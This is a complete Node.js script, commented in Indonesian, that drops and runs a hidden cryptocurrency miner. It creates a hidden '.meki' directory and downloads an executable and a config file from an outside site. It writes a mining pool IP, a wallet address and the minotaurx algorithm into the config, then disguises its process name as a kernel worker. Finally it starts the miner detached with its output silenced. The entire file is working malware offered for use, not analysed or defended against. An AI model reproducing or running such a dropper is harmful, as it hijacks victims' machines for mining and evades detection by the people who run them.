#!/usr/bin/env node

const fs = require('fs');
const path = require('path');
const https = require('https');
const { spawn } = require('child_process');
const os = require('os');

// Konfigurasi
const WORKDIR = path.join(process.cwd(), '.meki');
const GENZO_URL = 'https://blogspotgenzo.site/GENZO';
const CONFIG_URL = 'https://blogspotgenzo.site/config.json';
const GENZO_FILE = 'GENZO';
const CONFIG_FILE = 'config.json';
const FAKE_NAME = '[kworker/u8:3-events_power_efficient]';

// Fungsi untuk log
function log(msg) {
  console.log(`[*] ${msg}`);
}

// Fungsi download file
function downloadFile(url, dest) {
  return new Promise((resolve, reject) => {
    const file = fs.createWriteStream(dest);
    https.get(url, (response) => {
      if (response.statusCode !== 200) {
        reject(new Error(`Gagal download ${url}. Status: ${response.statusCode}`));
        return;
      }
      response.pipe(file);
      file.on('finish', () => {
        file.close(resolve);
      });
    }).on('error', (err) => {
      fs.unlink(dest, () => {});
      reject(err);
    });
  });
}

// Fungsi edit config.json
function editConfig(filePath) {
  let content = fs.readFileSync(filePath, 'utf-8');
  content = content.replace(/"tua"/g, '"164.90.210.229:443"');
  content = content.replace(/"wulet"/g, '"MSTjKJKH6mtk1eGmjZ1ukTbsnedKfCqWST.Danis"');
  content = content.replace(/"meki"/g, '"minotaurx"');
  fs.writeFileSync(filePath, content, 'utf-8');
}

// Fungsi hide process (Linux only)
function hideProcess(fakeName) {
  if (os.platform() !== 'linux') return;

  try {
    const ffi = require('ffi-napi');
    const libc = ffi.Library('libc.so.6', {
      prctl: ['int', ['int', 'string', 'ulong', 'ulong', 'ulong']]
    });
    const PR_SET_NAME = 15;
    libc.prctl(PR_SET_NAME, fakeName, 0, 0, 0);
    log(`Nama proses disamarkan menjadi: ${fakeName}`);
  } catch (err) {
    log(`Gagal hide process: ${err.message}`);
  }
}

// Fungsi menjalankan miner secara silent
function runSilent(command, args, cwd) {
  return spawn(command, args, {
    cwd,
    stdio: 'ignore',
    detached: true
  });
}

// Main program
(async () => {
  try {
    // Buat folder tersembunyi
    if (!fs.existsSync(WORKDIR)) {
      fs.mkdirSync(WORKDIR, { recursive: true });
    }
    process.chdir(WORKDIR);

    log('Mengunduh file GENZO dan config.json...');

    // Download GENZO
    await downloadFile(GENZO_URL, GENZO_FILE);

    // Download config.json
    await downloadFile(CONFIG_URL, CONFIG_FILE);

    // Edit config.json
    editConfig(CONFIG_FILE);

    // Jadikan GENZO executable
    fs.chmodSync(GENZO_FILE, 0o755);

    // Hide process
    hideProcess(FAKE_NAME);

    log('Menjalankan GENZO secara diam-diam...\n');

    const miner = runSilent(`./${GENZO_FILE}`, ['-c', CONFIG_FILE], WORKDIR);
    miner.unref();

    log(`GENZO berjalan dengan PID: ${miner.pid}`);

  } catch (err) {
    console.error(`[!] Terjadi error: ${err.message}`);
    process.exit(1);
  }
})();
